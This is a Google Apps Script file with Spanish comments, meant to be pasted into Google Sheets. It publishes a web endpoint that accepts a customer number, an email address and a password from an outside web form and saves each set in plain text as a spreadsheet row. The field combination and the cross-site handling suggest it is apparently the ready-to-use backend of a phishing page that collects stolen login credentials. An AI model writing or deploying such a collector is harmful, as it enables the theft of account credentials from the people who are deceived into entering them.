// ======================================================================
// CÓDIGO GOOGLE APPS SCRIPT PARA PEGAR EN GOOGLE SHEETS
// ======================================================================

function doGet(e) { return procesarDatos(e); }
function doPost(e) { return procesarDatos(e); }

function procesarDatos(e) {
  // Evitar error al darle "Ejecutar" por accidente en el editor
  if (!e || !e.parameter) {
    return ContentService.createTextOutput("Esperando datos desde la página web...").setMimeType(ContentService.MimeType.TEXT);
  }

  var sheet = SpreadsheetApp.getActiveSpreadsheet().getActiveSheet();

  // Variables que nos envía el formulario
  var numeroCliente = e.parameter.numeroCliente || "Vacío";
  var correo = e.parameter.correo || "Vacío";
  var contrasena = e.parameter.contrasena || "Vacío";

  // Escribimos los datos en la primera fila vacía disponible, comenzando desde la columna A
  sheet.appendRow([numeroCliente, correo, contrasena]);

  // Permitir respuesta para evitar errores CORS al final del proceso
  return ContentService.createTextOutput("Éxito").setMimeType(ContentService.MimeType.TEXT);
}
